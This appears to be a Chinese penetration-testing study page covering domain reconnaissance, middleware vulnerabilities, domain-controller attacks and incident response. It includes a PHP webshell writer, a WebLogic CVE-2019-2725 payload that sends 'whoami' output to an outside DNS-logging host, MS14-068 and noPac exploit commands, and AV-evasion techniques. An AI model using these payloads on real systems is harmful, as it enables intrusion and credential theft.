<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ipconfig /all   					查看本机ip，所在域</span><br><span class="line">route <span class="built_in">print</span>    						打印路由信息</span><br><span class="line">net view       						查看局域网内其他主机名</span><br><span class="line">arp -a          					查看arp缓存</span><br><span class="line">net start       					查看开启了哪些服务</span><br><span class="line">net share       					查看开启了哪些共享</span><br><span class="line">net share ipc$  					开启ipc共享</span><br><span class="line">net share c$    					开启c盘共享</span><br><span class="line">net use \\192.168.xx.xx\ipc$ <span class="string">&quot;&quot;</span> /user:<span class="string">&quot;&quot;</span>   			与192.168.xx.xx建立空连接</span><br><span class="line">net use \\192.168.xx.xx\c$ <span class="string">&quot;密码&quot;</span> /user:<span class="string">&quot;用户名&quot;</span>			建立c盘共享</span><br><span class="line"><span class="built_in">dir</span> \\192.168.xx.xx\c$\user    		查看192.168.xx.xx c盘user目录下的文件  </span><br><span class="line">net config Workstation   			查看计算机名、全名、用户名、系统版本、工作站、域、登录域</span><br><span class="line">net user                 			查看本机用户列表</span><br><span class="line">net time /domain        			查看时间服务器，判断主域，主域服务器都做时间服务器</span><br><span class="line">net user /domain         			查看域用户</span><br><span class="line">net localgroup administrators   	查看本地管理员组（通常会有域用户）</span><br><span class="line">net view /domain         			查看有几个域</span><br><span class="line">net user 用户名 /domain   			  获取指定域用户的信息</span><br><span class="line">net group /domain        			查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</span><br><span class="line">net group 组名 /domain    		  查看域中某工作组</span><br><span class="line">net group <span class="string">&quot;domain admins&quot;</span> /domain  	查看域管理员的名字</span><br><span class="line">net group <span class="string">&quot;domain computers&quot;</span> /domain  查看域中的其他主机名</span><br><span class="line">net group <span class="string">&quot;doamin controllers&quot;</span> /domain  查看域控制器（可能有多台）</span><br></pre></td></tr></table></figure>

<ul>
<li>尝试渗透域控或者域成员</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MS14-068</span><br><span class="line">MS17-010永恒之蓝</span><br><span class="line">noPac.exe</span><br><span class="line">域渗透ZeroLogon(CVE-2020-1472)</span><br></pre></td></tr></table></figure>

<ul>
<li>如果域渗透没有进展，可尝试通过其他未入域的存活主机进行渗透</li>
<li>如果拿到相关权限，需进行后渗透操作，清理痕迹、权限维持等</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">黄金/白银票据</span><br></pre></td></tr></table></figure>



<h2 id="php-Java反序列化"><a href="#php-Java反序列化" class="headerlink" title="php&#x2F;Java反序列化"></a>php&#x2F;Java反序列化</h2><h2 id="如何绕过cdn"><a href="#如何绕过cdn" class="headerlink" title="如何绕过cdn"></a>如何绕过cdn</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1（探测）.多地ping：因为cdn的目的是为了稳定速度，有些cdn服务商可能会在不同的地点或者ip设立节点服务器，所以不同地点ping出的ip不同则采用了cdn；但是多地ping出的ip相同也不一定就是真实ip，还要考虑单一cdn节点的可能性。</span><br><span class="line"></span><br><span class="line">2.二级域名：因为cdn流量还是比较贵的，所以不一定每个子域名都挂上了cdn，此时我们可以通过子域名来发现真实ip本地将目标域名绑定到同IP（修改host文件），如果能访问就说明目标站与此二级域名在同一个服务器上；如果两者不在同一服务器也可能在同C段，扫描C段所有开80端口的IP，然后挨个尝试。</span><br><span class="line"></span><br><span class="line">3.国外冷门dns服务器解析：大部分国内cdn服务商只针对国内市场，如果采用外国冷门服务器进行dns解析，有较大概率解析到真实ip</span><br><span class="line"></span><br><span class="line">4.通过网络空间测绘引擎或者情报平台搜索特有http头或者关键字</span><br><span class="line"></span><br><span class="line">5.查询历史dns解析记录，可能以前没有使用cdn，后来再用了cdn解析，如果中途没有换过真实ip，那么有几率获取到真实ip</span><br></pre></td></tr></table></figure>



<h2 id="中间件漏洞-三四个"><a href="#中间件漏洞-三四个" class="headerlink" title="中间件漏洞  三四个"></a>中间件漏洞  三四个</h2><h3 id="iis6-0解析漏洞"><a href="#iis6-0解析漏洞" class="headerlink" title="iis6.0解析漏洞"></a>iis6.0解析漏洞</h3><p>该版本默认将<code>*.asp;.jpg</code>此类格式的文件名，当成asp解析，服务器默认；后面的内容不解析，相当于截断，例如上传asp木马，就可以用<code>xx.asp;.jpg</code>来绕过；iis除了会将asp解析成脚本执行文件之外，还会将 cer cdx asa扩展名解析成asp</p>
<p><strong>防御：</strong>禁止上传畸形文件，图片目录设置为禁止脚本执行</p>
<h3 id="iis6-PUT漏洞"><a href="#iis6-PUT漏洞" class="headerlink" title="iis6 PUT漏洞"></a>iis6 PUT漏洞</h3><p>IIS Server在web中开启了webDAV 配置了可以写入的权限，造成了任意文件上传</p>
<p><strong>防御：</strong>关闭webDAV，关闭写入权限</p>
<h3 id="iis7-解析漏洞"><a href="#iis7-解析漏洞" class="headerlink" title="iis7 解析漏洞"></a>iis7 解析漏洞</h3><p>iis7.x版本在Fast-CGI运行模式下，在任意文件，例如：<code>a.jpg/png</code>后面加上<code>/.php</code>,会将<code>.jpg/png</code>解析为php文件</p>
<p><strong>防御：</strong>配置 cgi fix_pathinfo（php inil中）为0并重启php-cgi程序</p>
<h3 id="Apache未知拓展名解析"><a href="#Apache未知拓展名解析" class="headerlink" title="Apache未知拓展名解析"></a>Apache未知拓展名解析</h3><p>apache默认一个文件可以有多个以点切割的后缀，当最右的后缀无法识别时，就继续向左识别，直到识别到合法后缀才开始解析，如xxx.php.qqq，qqq无法识别，就继续解析，到php时能够识别，就解析为php文件</p>
<h3 id="Apache换行解析漏洞CVE-2017-15715"><a href="#Apache换行解析漏洞CVE-2017-15715" class="headerlink" title="Apache换行解析漏洞CVE-2017-15715"></a>Apache换行解析漏洞CVE-2017-15715</h3><p>2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略</p>
<h3 id="Apache-ssi-远程命令执行漏洞"><a href="#Apache-ssi-远程命令执行漏洞" class="headerlink" title="Apache ssi 远程命令执行漏洞"></a>Apache ssi 远程命令执行漏洞</h3><p>当目标服务器开启了SSI与CGI支持,我们就可以上传shtml,利用 语法执行命令。</p>
<p>使用SSI(Server Side Include)的html文件扩展名，SSI（Server Side Include)，通常称为”服务器端嵌入”或者叫”服务器端包含”，是一种类似于ASP的基于服务器的网页制作技术。默认扩展名是 .stm、.shtm 和 .shtml</p>
<h3 id="Tomcat弱口令-war远程部署"><a href="#Tomcat弱口令-war远程部署" class="headerlink" title="Tomcat弱口令&amp;war远程部署"></a>Tomcat弱口令&amp;war远程部署</h3><p>Tomcat存在后台管理，账号密码设置在conf&#x2F;tomcat-users.xml</p>
<p>弱口令或爆破(爆破采用数据包base64传递认证)<br>把shell.jsp在本地打包成zip，然后重命名为war，之后上传war，会自动解压，从而getshell</p>
<h3 id="Nginx畸形解析漏洞"><a href="#Nginx畸形解析漏洞" class="headerlink" title="Nginx畸形解析漏洞"></a>Nginx畸形解析漏洞</h3><p>IS 7.0&#x2F;IIS 7.5&#x2F; Nginx &lt;8.03</p>
<p>在默认Fast-CGI开启状况下,上传一个名字为shell.jpg，内容为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval($_POST[cmd])?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>nginx默认是以CGI的方式支持PHP解析的,普遍的做法是在 Nginx配置文件中</p>
<p>通过正则匹配设置 SCRIPT_FILENAME。</p>
<p>当访可<a href="http://127.0.0.1/phpinfo.jpg/1.php%E8%BF%99%E4%B8%AAURL%E6%97%B6">http://127.0.0.1/phpinfo.jpg/1.php这个URL时</a></p>
<p>$fastcgi_script_name会被设置为 “phpinfo.jpg&#x2F;1.php”</p>
<p>SCRIPT_FILENAME传递给 PHP CGI,如果PHP中开启了 fix_pathing这个选项</p>
<p>PHP会认为 SCRIPT_FILENAME是 phpinfo.jpg,而1.php是 PATH_INFO,所以就会将 phpinfo.jpg作为PHP文件来解析</p>
<h3 id="Nginx-fastcgi缓存文件包含"><a href="#Nginx-fastcgi缓存文件包含" class="headerlink" title="Nginx-fastcgi缓存文件包含"></a>Nginx-fastcgi缓存文件包含</h3><p>原理：</p>
<ul>
<li>Nginx 在后端 Fastcgi 响应过大 或 请求正文 body 过大时会产生临时文件</li>
<li>通过多重链接绕过 PHP LFI stat 限制完成 LFI</li>
</ul>
<p><a href="https://tttang.com/archive/1384/">https://tttang.com/archive/1384/</a></p>
<h3 id="Weblogic弱口令"><a href="#Weblogic弱口令" class="headerlink" title="Weblogic弱口令"></a>Weblogic弱口令</h3><p>在weblogic搭建好之后没有修改进入后台的密码导致弱口令登录获得webshell<br>访问<a href="http://127.0.0.1:7001/console">http://127.0.0.1:7001/console</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">默认账密：weblogic/Oracle@123</span><br></pre></td></tr></table></figure>

<h3 id="Weblogic反序列化CVE-2015-4852、CVE-2016-3510"><a href="#Weblogic反序列化CVE-2015-4852、CVE-2016-3510" class="headerlink" title="Weblogic反序列化CVE-2015-4852、CVE-2016-3510"></a>Weblogic反序列化CVE-2015-4852、CVE-2016-3510</h3><p>危害：远程命令执行</p>
<h3 id="Weblogic-SSRF-CVE-2014-4210"><a href="#Weblogic-SSRF-CVE-2014-4210" class="headerlink" title="Weblogic SSRF CVE-2014-4210"></a>Weblogic SSRF CVE-2014-4210</h3><p>利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001</span><br></pre></td></tr></table></figure>

<h3 id="Weblogic任意文件读取-上传-CVE-2019-2615-2618"><a href="#Weblogic任意文件读取-上传-CVE-2019-2615-2618" class="headerlink" title="Weblogic任意文件读取&#x2F;上传 | CVE-2019-2615&#x2F;2618"></a>Weblogic任意文件读取&#x2F;上传 | CVE-2019-2615&#x2F;2618</h3><p>需要用户名密码认证</p>
<h3 id="Weblogic反序列化远程命令执行CVE-2019-2725"><a href="#Weblogic反序列化远程命令执行CVE-2019-2725" class="headerlink" title="Weblogic反序列化远程命令执行CVE-2019-2725"></a>Weblogic反序列化远程命令执行CVE-2019-2725</h3><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/_async/AsyncResponseService</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>IP:PORT</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>859</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">SOAPAction</span>:</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Apache-HttpClient/4.1.1 (java 1.5)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">content-type</span><span class="punctuation">: </span>text/xml</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> <span class="attr">xmlns:wsa</span>=<span class="string">&quot;http://www.w3.org/2005/08/addressing&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml"><span class="attr">xmlns:asy</span>=<span class="string">&quot;http://www.bea.com/async/AsyncResponseService&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">wsa:Action</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:Action</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">wsa:RelatesTo</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:RelatesTo</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">string</span>&gt;</span>ping `whoami`.74g4hi.dnslog.cn<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">asy:onAsyncDelivery</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<h3 id="Weblogic未授权远程命令执行漏洞CVE-2020-14882，CVE-2020-14883"><a href="#Weblogic未授权远程命令执行漏洞CVE-2020-14882，CVE-2020-14883" class="headerlink" title="Weblogic未授权远程命令执行漏洞CVE-2020-14882，CVE-2020-14883"></a>Weblogic未授权远程命令执行漏洞CVE-2020-14882，CVE-2020-14883</h3><p>只能在Weblogic 12.2.1以上版本利用，因为10.3.6并不存在com.tangosol.coherence.mvel2.sh.ShellSession类</p>
<ul>
<li>CVE-2020-14882允许未授权的用户绕过管理控制台的权限验证访问后台</li>
<li>CVE-2020-14883允许后台任意用户通过HTTP协议执行任意命令</li>
</ul>
<h3 id="Weblogic后台war后门文件部署"><a href="#Weblogic后台war后门文件部署" class="headerlink" title="Weblogic后台war后门文件部署"></a>Weblogic后台war后门文件部署</h3><h2 id="打域控的方法"><a href="#打域控的方法" class="headerlink" title="打域控的方法"></a>打域控的方法</h2><h3 id="MS14-068-Kerberos域用户提权漏洞"><a href="#MS14-068-Kerberos域用户提权漏洞" class="headerlink" title="MS14-068 Kerberos域用户提权漏洞"></a>MS14-068 Kerberos域用户提权漏洞</h3><p>前提：</p>
<ol>
<li>域账户</li>
<li>域账户密码</li>
<li>SID</li>
<li>域控IP</li>
</ol>
<p>MS14-068是内网横向PTT攻击的一种</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">MS14-068.exe -u test02@hack.lab -s S-1-5-21-3725850554-4274512539-2478289712-1112 -d 192.168.1.1 -p Test03!@<span class="comment">#</span></span><br></pre></td></tr></table></figure>



<h3 id="域渗透Zerologon-Netlogon-CVE-2020-1472"><a href="#域渗透Zerologon-Netlogon-CVE-2020-1472" class="headerlink" title="域渗透Zerologon&#x2F;Netlogon CVE-2020-1472"></a>域渗透Zerologon&#x2F;Netlogon CVE-2020-1472</h3><p>影响MS-NRPC所使用的加密身份验证方案（AES-CFB8）</p>
<blockquote>
<p>AES-CFB8的工作原理是，通过在明文前面添加一个16字节的初始化矢量（IV），然后将AES应用于IV和明文的前16个字节，并采用AES输出的第一个字节，来加密明文的每个字节，然后将其与下一个纯文本字节进行异或</p>
<p>对于256个密钥中的1个，对全零的纯文本应用AESCFB8加密将导致全零的密文，从而启用登录绕过，这就是名称zerologon的来源</p>
</blockquote>
<h3 id="永恒之蓝"><a href="#永恒之蓝" class="headerlink" title="永恒之蓝"></a>永恒之蓝</h3><p>条件：139、445端口开放</p>
<h3 id="nopac-CVE-2021-42278-42287"><a href="#nopac-CVE-2021-42278-42287" class="headerlink" title="nopac  CVE-2021-42278&#x2F;42287"></a>nopac  CVE-2021-42278&#x2F;42287</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#检测</span></span><br><span class="line">./noPac.exe scan -domain test1.local -user kk -pass 123Q</span><br><span class="line"></span><br><span class="line"><span class="comment">#漏洞利用</span></span><br><span class="line">./noPac.exe -domain test1.local -user kk -pass <span class="string">&quot;123QWE..&quot;</span> /dc dc.test1.local /mAccount demo123 /mPassword Password123！/service cifs /ptt</span><br></pre></td></tr></table></figure>



<h3 id="pth-ptk-ptt"><a href="#pth-ptk-ptt" class="headerlink" title="pth&#x2F;ptk&#x2F;ptt"></a>pth&#x2F;ptk&#x2F;ptt</h3><h3 id="smb中继"><a href="#smb中继" class="headerlink" title="smb中继"></a>smb中继</h3><h3 id="ntlm-relay"><a href="#ntlm-relay" class="headerlink" title="ntlm relay"></a>ntlm relay</h3><p>NTLM hash 分为 NTLMv1 NTLMv2 NTLM session v2 三种，NTLMv2 的强度比 NTLMv1 强了不少 ，我们在实战中，如果获得的是NTLMv1的话直接对其进行爆破就行了，而现实情况中我们遇到的是 NTLMv2，NTLMv2的密码强度高了不少，因此如果你没有一个超级强大的字典，你很难得到明文密码，将截获的Net-NTLM Hash重放来进行攻击，从而实现对其他机器的控制</p>
<p>为了重放这个Net-NTLMhash，首先我们要做的就是获取这个Net-NTLMhash。</p>
<p>由于SMB、HTTP、LDAP、MSSQL等协议都可以携带NTLM认证的三类消息，所以只要是使用SMB、HTTP、LDAP、MSSQL等协议来进行NTLM认证的程序，都可以尝试向攻击者发送Net-NTLMhash从而让攻击者截获用户的Net-NTLMhash，也就是说我们可以通过这些协议来进行攻击</p>
<h3 id="adcs域内提权CVE-2022-26923"><a href="#adcs域内提权CVE-2022-26923" class="headerlink" title="adcs域内提权CVE-2022-26923"></a>adcs域内提权CVE-2022-26923</h3><h3 id="域管token横向"><a href="#域管token横向" class="headerlink" title="域管token横向"></a>域管token横向</h3><p>令牌(token)是系统的临时秘钥，相当于账号和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌将持续存在于系统中，除非系统重新启动。令牌最大的特点就是随机性，不可预测，黑客或软件无法猜测出令牌。<br>令牌(token)可以假冒，当我们需要域管理员操作权限时，就可以通过假冒域管理员的令牌进行攻击：<br>这里我们主要说访问令牌(Access Token),在windows中Access Token分为两种：授权令牌(Delegation Token)和模拟令牌(Impresonation Token) ；它们之前的区别就在于前者属于交互式会话登陆，而后者属于非交互的会话，两种Token在系统重启后会清除，但前者的Token用户在注销后，会变成后者。</p>
<p>此方法需要administrator管理员权限，当我们如果只是一个webshell或者user组权限时，是需要先进行提权操作。</p>
<p><strong>token窃取方法</strong></p>
<ol>
<li>incognito.exe：适用于有杀软，不出网，防火墙限制，cs&#x2F;msf无法上线的情况</li>
<li>msf的incognito模块：适用于meterpreter上线后的机器</li>
<li>cs窃取token：steal_token，cs上线后可用</li>
</ol>
<h3 id="打域控开放的服务"><a href="#打域控开放的服务" class="headerlink" title="打域控开放的服务"></a>打域控开放的服务</h3><h3 id="dcom-wmi"><a href="#dcom-wmi" class="headerlink" title="dcom wmi"></a>dcom wmi</h3><h3 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h3><h4 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h4><h3 id="spn漏洞"><a href="#spn漏洞" class="headerlink" title="spn漏洞"></a>spn漏洞</h3><h3 id="CVE-2022-26809"><a href="#CVE-2022-26809" class="headerlink" title="CVE-2022-26809"></a>CVE-2022-26809</h3><h3 id="CVE-2021-1732"><a href="#CVE-2021-1732" class="headerlink" title="CVE-2021-1732"></a>CVE-2021-1732</h3><h2 id="编写exp相关经历"><a href="#编写exp相关经历" class="headerlink" title="编写exp相关经历"></a>编写exp相关经历</h2><ul>
<li></li>
</ul>
<h2 id="windows和linux的应急响应"><a href="#windows和linux的应急响应" class="headerlink" title="windows和linux的应急响应"></a>windows和linux的应急响应</h2><h3 id="研判"><a href="#研判" class="headerlink" title="研判"></a>研判</h3><h4 id="正在被入侵"><a href="#正在被入侵" class="headerlink" title="正在被入侵"></a>正在被入侵</h4><p>若发现攻击者正在进行入侵（web漏洞扫描，弱口令爆破等）：一般情况下都会产生日志，尽量采用远程日志系统（rsylog等），远程日志可以防止黑客删除日志；溯源找到攻击者的源IP，并在防火墙等位置做出相应处置（封堵等）</p>
<h4 id="目的未达成"><a href="#目的未达成" class="headerlink" title="目的未达成"></a>目的未达成</h4><p>若发现攻击者已成功上传木马、后门等，流量数据正在回传的情况：建立内存备份（快照，dump内存等），方便后续进行取证；进行内存取证&#x2F;快照分析，定位到相应的木马文件（webshell，shellcode等）和攻击者利用的漏洞点，进行相关处理（删除或修复），防止二次入侵；根据攻击者的流量分析出攻击者的意图（攻击者想要干什么）；确定攻击者的ip，在防火墙等位置进行相关处理；选择性重启服务器进入安全模式，对相应后门进行排查和删除</p>
<h4 id="目的已达成"><a href="#目的已达成" class="headerlink" title="目的已达成"></a>目的已达成</h4><p>若发现攻击者已经达成目的，删除了相关木马文件和日志：首先定位被入侵的时间点，方便后续针对该时间点进行分析；建立内存备份（快照，dump内存等），方便后续进行取证；定位到被入侵的时间点，查找攻击者的攻击流量并分析，找到相关的木马或后门信息（链接，文件名等）以及利用的漏洞点，确定攻击者的ip；查找系统内对应时间点相关的日志，分析找到相关线索；如果日志被删除，尝试通过硬盘数据备份进行数据恢复</p>
<h3 id="判断误报"><a href="#判断误报" class="headerlink" title="判断误报"></a>判断误报</h3><p>首先分析相关数据包的内容是否为攻击流量（后门，webshell等）；分析报的ip相关的历史流量，是否有过攻击行为；如果没有则可能是误报，不处理（可以误报，但不能漏报）</p>
<h3 id="挖矿病毒排查"><a href="#挖矿病毒排查" class="headerlink" title="挖矿病毒排查"></a>挖矿病毒排查</h3><h4 id="Windows系统"><a href="#Windows系统" class="headerlink" title="Windows系统"></a>Windows系统</h4><ul>
<li>因为挖矿病毒的目的性，决定了挖矿病毒要占用很高的CPU或GPU性能，首先任务管理器结束掉占用高的进程，记录进程名和位置</li>
<li>挖矿病毒需要联网，使用<code>netstat -ano | findstr ESTABLISHED</code> 排查是否存在恶意网络连接</li>
<li>查找有无新增用户<code>net user</code>，查看计划任务是否存在异常</li>
<li>删除相关异常文件，观察是否还存在内存占用高的情况</li>
</ul>
<h4 id="Linux系统"><a href="#Linux系统" class="headerlink" title="Linux系统"></a>Linux系统</h4><ul>
<li>依然是查找占用内存高的进程top、htop等</li>
<li>查看是否有恶意网络连接或未授权的端口监听netstat -antp</li>
<li>通过进程名pid或关键词查找挖矿病毒，大概率在tmp目录下，可直接清空</li>
<li>排查异常用户</li>
<li>排查每个用户的异常定时脚本，查看定时任务<code>crontab -l</code>，删除定时任务<code>crontab -d</code>，重启定时任务服务<code>servcice crond restart</code></li>
<li>观察是否还存在内存占用高的情况</li>
</ul>
<h2 id="溯源方法"><a href="#溯源方法" class="headerlink" title="溯源方法"></a>溯源方法</h2><h3 id="对内溯源"><a href="#对内溯源" class="headerlink" title="对内溯源"></a>对内溯源</h3><p>若攻击者已经成功入侵，首先确认攻击者的思路，从已经上传的工具入手，分析流量。对攻击流量进行阻断，删除相关恶意工具，查看对应的中间件日志，查看请求行为，分析攻击者思路</p>
<h3 id="对外溯源"><a href="#对外溯源" class="headerlink" title="对外溯源"></a>对外溯源</h3><p>确认攻击者的真实信息</p>
<p>一般情况下可以直接拿到的攻击者信息：攻击时间，攻击者ip，受攻击目标，恶意文件（不一定有），通过攻击类型分析攻击详情的请求包，判断是否为真实ip（肉鸡ip）</p>
<p>优先级</p>
<ul>
<li>端口扫描-个人vps&#x2F;空间搜索引擎-优先</li>
<li>命令执行-未隐蔽网络&#x2F;移动网络&#x2F;肉鸡-优先</li>
<li>恶意文件-是否存在未屏蔽的关键信息-优先</li>
</ul>
<p>尽可能还原攻击者画像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">姓名/IP	攻击IP	地理位置	QQ	微信	邮箱	手机号</span><br><span class="line">支付宝	IP地址所属公司	IP地址关联域名	人物照片	</span><br><span class="line">跳板机(可选)</span><br></pre></td></tr></table></figure>



<h2 id="java内存马"><a href="#java内存马" class="headerlink" title="java内存马"></a>java内存马</h2><h3 id="web-xml"><a href="#web-xml" class="headerlink" title="web.xml"></a>web.xml</h3><p>java网站都一定会有一个web容器。listener、filter、servlet都是在web.xml中配置的</p>
<p><a href="https://www.cnblogs.com/hellojava/archive/2012/12/28/2835730.html">https://www.cnblogs.com/hellojava/archive/2012/12/28/2835730.html</a></p>
<h3 id="listener"><a href="#listener" class="headerlink" title="listener"></a>listener</h3><p>监听器，本质上是一个java类，作用是Application、session、request三大对象的创建或者删除，根据监听结果来执行提前编写的代码；简单来说，就是通过监听某个行为，来触发某段代码执行</p>
<h3 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h3><p>筛选器，本质上是一个java类，作用是接收web端的请求并对其进行修改（格式化）和内容判断，变成<strong>servlet</strong>能够接收的数据格式；如果没有filter，则直接将web端的请求发给servlet；可配置多个filter</p>
<h3 id="filter的生命周期"><a href="#filter的生命周期" class="headerlink" title="filter的生命周期"></a>filter的生命周期</h3><p>filter的创建和销毁由web容器负责；web程序启动时创建filter的实例对象，读取web.xml，完成对象的初始化功能</p>
<p>Filter对象创建后会驻留在内存，当web应用移除或服务器停止时才销毁。销毁函数会在Web容器卸载 Filter 对象之前被调用。该方法在Filter的生命周期中仅执行一次。在这个方法中，可以释放过滤器使用的资源。</p>
<h3 id="filterchains"><a href="#filterchains" class="headerlink" title="filterchains"></a>filterchains</h3><p>当存在多个filter的时候就组成了filter链，web服务根据在web.xml中的filter注册顺序进行调用；当第一个Filter的doFilter方法被调用时，web服务器会创建一个代表Filter链的FilterChain，然后调用filterchain中其他filter的filter.doFilter方法</p>
<h3 id="servlet"><a href="#servlet" class="headerlink" title="servlet"></a>servlet</h3><p>本质上是一个java类；由容器进行调度和执行，进行数据处理的核心模块，里面有一个函数services，这个函数是servlet的核心代码，实现servlet的核心功能；所有的servlet在第一次访问的时候创建，直到服务器关闭的时候才销毁。</p>
<h2 id="免杀有无研究"><a href="#免杀有无研究" class="headerlink" title="免杀有无研究"></a>免杀有无研究</h2><p>shellcode分离免杀</p>
<p>硬编码异或免杀</p>
<p>干扰字符免杀</p>
<p>调用冷门函数</p>
<p>加壳，花指令</p>
<p>修改内存特征</p>
<h2 id="域内横向移动的方法"><a href="#域内横向移动的方法" class="headerlink" title="域内横向移动的方法"></a>域内横向移动的方法</h2><h3 id="IPC共享"><a href="#IPC共享" class="headerlink" title="IPC共享"></a>IPC共享</h3><p>条件：开启了139，445端口，开启了IPC$默认共享，知道目标的账户密码</p>
